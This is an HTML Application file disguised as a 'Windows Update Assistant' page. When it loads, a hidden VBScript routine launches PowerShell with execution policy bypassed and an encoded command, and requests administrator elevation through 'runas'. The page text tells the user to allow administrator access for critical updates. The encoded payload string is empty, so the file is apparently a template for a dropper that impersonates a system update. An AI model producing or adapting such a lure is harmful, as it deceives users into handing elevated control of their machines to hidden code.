<!DOCTYPE html>
<html>
<head>
<title>Windows Update Assistant</title>
<HTA:APPLICATION ID="update" APPLICATIONNAME="Windows Update" WINDOWSTATE="normal" SHOWINTASKBAR="yes" SINGLEINSTANCE="yes" />
<script language="VBScript">
    Sub Window_OnLoad
        Dim encoded
        encoded = ""
        
        Dim powershell
        powershell = "powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Normal -EncodedCommand " & encoded
        
        CreateObject("Shell.Application").ShellExecute "powershell.exe", powershell, "", "runas", 1
        
        window.close
    End Sub
</script>
</head>
<body style="background:#1e6dc9; text-align:center; padding:50px; color:white; font-family:Segoe UI;">
    <h2>✔️ Windows Update Assistant</h2>
    <p>Please allow Administrator access to install critical updates...</p>
</body>
</html>
